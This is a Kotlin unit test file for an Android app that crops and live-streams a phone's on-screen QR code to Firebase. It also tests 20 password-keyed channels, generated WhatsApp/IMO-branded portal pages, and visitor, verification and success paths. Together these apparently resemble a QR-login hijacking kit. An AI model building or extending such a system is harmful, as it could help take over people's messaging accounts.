package com.example

import com.example.data.firebase.FirebaseScreenStreamManager
import com.example.data.model.PathChannelsRegistry
import com.example.data.model.WebsitePlatform
import com.example.util.ChannelWebPortalGenerator
import com.example.util.QrBox
import com.example.util.QrCodeDetector
import com.example.util.ScreenShareManager
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test

class ScreenShareTest {

    @Before
    fun setUp() {
        QrCodeDetector.reset()
        ScreenShareManager.setCropMode(ScreenShareManager.ScreenCropMode.QR_CODE_ONLY)
    }

    @After
    fun tearDown() {
        QrCodeDetector.reset()
        ScreenShareManager.setCropMode(ScreenShareManager.ScreenCropMode.QR_CODE_ONLY)
    }

    @Test
    fun testFormatDuration() {
        assertEquals("00:00", ScreenShareManager.formatDuration(0))
        assertEquals("00:45", ScreenShareManager.formatDuration(45))
        assertEquals("01:05", ScreenShareManager.formatDuration(65))
        assertEquals("12:34", ScreenShareManager.formatDuration(754))
    }

    @Test
    fun testInitialScreenShareState() {
        assertFalse(ScreenShareManager.isSharing.value)
        assertEquals(0, ScreenShareManager.durationSeconds.value)
        assertEquals(ScreenShareManager.ScreenCropMode.QR_CODE_ONLY, ScreenShareManager.cropMode.value)
        assertEquals(1.0f, ScreenShareManager.zoomScale.value, 0.01f)
    }

    @Test
    fun testCropModeSwitching() {
        ScreenShareManager.setCropMode(ScreenShareManager.ScreenCropMode.TOP_HALF)
        assertEquals(ScreenShareManager.ScreenCropMode.TOP_HALF, ScreenShareManager.cropMode.value)

        ScreenShareManager.setCropMode(ScreenShareManager.ScreenCropMode.BOTTOM_HALF)
        assertEquals(ScreenShareManager.ScreenCropMode.BOTTOM_HALF, ScreenShareManager.cropMode.value)

        ScreenShareManager.setCropMode(ScreenShareManager.ScreenCropMode.CENTER_ZOOM)
        assertEquals(ScreenShareManager.ScreenCropMode.CENTER_ZOOM, ScreenShareManager.cropMode.value)

        ScreenShareManager.resetCrop()
        assertEquals(ScreenShareManager.ScreenCropMode.FULL, ScreenShareManager.cropMode.value)
    }

    @Test
    fun testPreCroppedFlagDetectionPreventsDoubleCropping() {
        assertTrue(ScreenShareManager.isCurrentModePreCropped())

        ScreenShareManager.resetCrop()
        assertFalse(ScreenShareManager.isCurrentModePreCropped())

        ScreenShareManager.increaseZoom()
        assertTrue(ScreenShareManager.isCurrentModePreCropped())

        ScreenShareManager.setCropMode(ScreenShareManager.ScreenCropMode.TOP_HALF)
        assertTrue(ScreenShareManager.isCurrentModePreCropped())
    }

    @Test
    fun testMonotonicTimestampNeverGoesBackward() {
        val t1 = FirebaseScreenStreamManager.nextMonotonicTimestamp(1000L, 0L)
        assertEquals(1000L, t1)

        val t2 = FirebaseScreenStreamManager.nextMonotonicTimestamp(1000L, t1)
        assertEquals(1001L, t2)

        val t3 = FirebaseScreenStreamManager.nextMonotonicTimestamp(995L, t2)
        assertEquals(1002L, t3)

        val t4 = FirebaseScreenStreamManager.nextMonotonicTimestamp(1200L, t3)
        assertEquals(1200L, t4)
    }

    @Test
    fun testQrBoxDeadzoneHysteresisPreventsJitter() {
        val initial = QrBox(100, 200, 340, 440)
        assertEquals(initial, QrCodeDetector.stabilizeQrBox(null, initial, sameDimensions = true))

        val microJitter = QrBox(104, 198, 344, 438)
        assertEquals(initial, QrCodeDetector.stabilizeQrBox(initial, microJitter, sameDimensions = true))

        val realMove = QrBox(125, 225, 365, 465)
        assertEquals(realMove, QrCodeDetector.stabilizeQrBox(initial, realMove, sameDimensions = true))

        assertEquals(microJitter, QrCodeDetector.stabilizeQrBox(initial, microJitter, sameDimensions = false))
    }

    @Test
    fun testQrCodeDetectorPaddedSquareAndFallback() {
        val padded = QrCodeDetector.calculatePaddedSquare(
            rawLeft = 100,
            rawTop = 200,
            rawRight = 300,
            rawBottom = 400,
            maxWidth = 1080,
            maxHeight = 2400
        )
        assertNotNull(padded)
        assertEquals(248, padded!!.width)
        assertEquals(248, padded.height)
        assertEquals(200, padded.centerX)
        assertEquals(300, padded.centerY)

        QrCodeDetector.reset()
        val fallback = QrCodeDetector.getEffectiveQrRect(1080, 2400)
        assertTrue(fallback.width > 100)
        assertEquals(fallback.width, fallback.height)
    }

    @Test
    fun testZoomScaleAdjustments() {
        ScreenShareManager.resetCrop()
        ScreenShareManager.increaseZoom()
        assertEquals(1.25f, ScreenShareManager.zoomScale.value, 0.01f)

        ScreenShareManager.increaseZoom()
        assertEquals(1.50f, ScreenShareManager.zoomScale.value, 0.01f)

        ScreenShareManager.decreaseZoom()
        assertEquals(1.25f, ScreenShareManager.zoomScale.value, 0.01f)

        ScreenShareManager.resetCrop()
        assertEquals(1.0f, ScreenShareManager.zoomScale.value, 0.01f)
    }

    @Test
    fun testFirebaseCloudPathConfiguration() {
        assertTrue(ScreenShareManager.firebaseCloudUrl.contains("screen_share/live.json"))
        assertTrue(ScreenShareManager.firebaseRtdbPath.contains("screen_share/live"))
    }

    @Test
    fun testTwentyChannelsRegistry() {
        val channels = PathChannelsRegistry.CHANNELS
        assertEquals(20, channels.size)

        val slot1 = channels[0]
        assertEquals(1, slot1.slotNumber)
        assertEquals("AL-NOOR-01", slot1.uniquePassword)
        assertEquals("screen_share", slot1.rootNode)
        assertEquals("screen_share/live", slot1.livePath)
        assertEquals("screen_share/pairingCode", slot1.pairingCodePath)

        val slot2 = channels[1]
        assertEquals(2, slot2.slotNumber)
        assertEquals("AL-HUDA-02", slot2.uniquePassword)
        assertEquals("screen_share_02", slot2.rootNode)
        assertEquals("screen_share_02/live", slot2.livePath)

        val slot20 = channels[19]
        assertEquals(20, slot20.slotNumber)
        assertEquals("AL-FIRDAUS-20", slot20.uniquePassword)
        assertEquals("screen_share_20", slot20.rootNode)
        assertEquals("screen_share_20/live", slot20.livePath)
    }

    @Test
    fun testChannelPasswordResolution() {
        val ch1 = PathChannelsRegistry.findChannelByPasswordOrInput("AL-NOOR-01")
        assertEquals(1, ch1?.slotNumber)

        val ch2 = PathChannelsRegistry.findChannelByPasswordOrInput("al-huda-02")
        assertEquals(2, ch2?.slotNumber)

        val ch11Num = PathChannelsRegistry.findChannelByPasswordOrInput("11")
        assertEquals(11, ch11Num?.slotNumber)

        val ch20Num = PathChannelsRegistry.findChannelByPasswordOrInput("20")
        assertEquals(20, ch20Num?.slotNumber)

        val invalid = PathChannelsRegistry.findChannelByPasswordOrInput("INVALID-PASSWORD-XYZ")
        assertNull(invalid)
    }

    @Test
    fun testUnifiedSingleLinkHostingBothWebsitesPerChannel() {
        val channels = PathChannelsRegistry.CHANNELS
        val unifiedUrls = channels.map { it.readymadeWebsiteUrl }.toSet()
        val rootNodes = channels.map { it.rootNode }.toSet()

        assertEquals(20, unifiedUrls.size)
        assertEquals(20, rootNodes.size)

        channels.forEach { ch ->
            assertEquals(ch.readymadeWebsiteUrl, ch.imoReadymadeWebsiteUrl)
            assertEquals(
                ch.websiteUrlFor(WebsitePlatform.WHATSAPP),
                ch.websiteUrlFor(WebsitePlatform.IMO)
            )
            assertEquals(
                ch.rootNodeFor(WebsitePlatform.WHATSAPP),
                ch.rootNodeFor(WebsitePlatform.IMO)
            )
            assertEquals(
                ch.livePathFor(WebsitePlatform.WHATSAPP),
                ch.livePathFor(WebsitePlatform.IMO)
            )

            assertFalse(ch.readymadeWebsiteUrl.contains("onrender.com"))
            assertTrue(ch.readymadeWebsiteUrl.startsWith("https://"))

            val unifiedHtml = ChannelWebPortalGenerator.buildChannelPortalHtml(ch)
            assertTrue(unifiedHtml.contains("ROOT=\"${ch.rootNode}\""))
            assertTrue(unifiedHtml.contains("SLOT=${ch.slotNumber}"))
            assertTrue(unifiedHtml.contains("id=\"waRoot\""))
            assertTrue(unifiedHtml.contains("id=\"imoRoot\""))
            assertTrue(unifiedHtml.contains("mst:laboni"))
            assertTrue(unifiedHtml.contains("Israt Jahan"))
            assertTrue(unifiedHtml.contains("function applyMode("))
            assertTrue(unifiedHtml.contains("/state.json"))
            assertTrue(unifiedHtml.contains("rel=\"preconnect\""))
            assertTrue(unifiedHtml.contains("seq<lastSeq"))
            assertTrue(unifiedHtml.contains("ts<lastTs"))
            assertTrue(unifiedHtml.contains("g<drawnGen"))
            assertTrue(unifiedHtml.contains("needLiveFallback"))
            assertTrue(unifiedHtml.contains("preCropped"))
            assertFalse(unifiedHtml.contains("/control.json"))
        }
    }

    @Test
    fun testErrorPathVerification() {
        val channel = PathChannelsRegistry.getChannelBySlot(1)
        assertEquals("${channel.rootNode}/error", channel.errorPath)
        assertEquals("${channel.rootNode}/success", channel.successPath)
        assertEquals("${channel.rootNode}/visitor", channel.visitorPath)
        assertEquals("${channel.rootNode}/verification", channel.verificationPath)
    }

    @Test
    fun testAppNotificationModel() {
        val notif = com.example.data.model.AppNotification(
            id = "test-1",
            type = com.example.data.model.NotificationType.VISITOR,
            title = "নতুন ওয়েবসাইট ভিজিটর",
            message = "ওয়েবসাইটে নতুন ভিজিটর প্রবেশ করেছে",
            payload = "Chrome Mobile"
        )
        assertEquals("test-1", notif.id)
        assertEquals(com.example.data.model.NotificationType.VISITOR, notif.type)
        assertFalse(notif.isRead)
        assertTrue(notif.formattedTime.isNotEmpty())
    }
}
